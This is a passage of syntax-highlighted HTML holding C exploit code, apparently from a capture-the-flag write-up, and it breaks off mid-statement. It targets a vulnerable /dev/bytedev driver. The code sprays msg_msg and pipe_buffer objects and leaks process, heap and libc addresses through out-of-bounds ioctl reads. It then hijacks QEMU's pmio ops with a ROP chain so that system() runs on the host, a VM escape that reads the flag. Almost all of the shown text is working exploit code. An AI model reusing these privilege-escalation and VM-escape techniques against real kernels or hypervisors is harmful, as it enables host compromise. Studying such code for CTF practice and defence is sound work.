class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    qemu_escape();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_escape</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span> *fake_ops = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak process base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x114514</span>, <span class="number">1</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-25</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x474039</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x2e0250</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_read_addr = elf_base + <span class="number">0x474039</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] process base: \033[0m %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] system addr: \033[0m %p\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    read(fd, fake_ops, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak heap base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x186</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x2ae00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> parent_object = heap_base + <span class="number">0x9f650</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = heap_base + <span class="number">0x10adc20</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_ops_addr = opaque_addr + <span class="number">0xb68</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap base: \033[0m %p\n&quot;</span>, heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] parent_object addr: \033[0m %p\n&quot;</span>, parent_object);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] opaque addr: \033[0m %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak libc base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-388</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span> * <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x7</span> * <span class="number">8</span>) - <span class="number">0x4385f0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_rsp_rbx = <span class="number">0x5b4d0</span> + libc_base;</span><br><span class="line">    <span class="comment">// mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    <span class="keyword">uint64_t</span> magic_gadget = <span class="number">0x0000000000151990</span> + libc_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] libc base: \033[0m %p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] magic gadget addr: \033[0m %p\n&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;nl flag\x00&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> command_addr = opaque_addr + <span class="number">0xf8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] prepare for hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810, -0x16d);</span></span><br><span class="line">    <span class="comment">// read(fd, buf, 0x200);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x18</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">8</span>) = opaque_addr + <span class="number">0x100</span> - <span class="number">0x20</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe0</span>) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe8</span>) = command_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf0</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf8</span>) = *(<span class="keyword">uint64_t</span> *)command;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = mov_rsp_rbx;</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x108</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x16d</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-6</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops) = pmio_read_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops + <span class="number">8</span>) = magic_gadget;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span> + i * <span class="number">8</span>) = *(<span class="keyword">uint64_t</span> *)(fake_ops + i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] ready to hijack! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-347</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = opaque_addr + <span class="number">0xc28</span>;</span><br><span class="line">    write(fd, buf, <span class="number">0x50</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">0x196082</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810,);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] done! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_qid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = 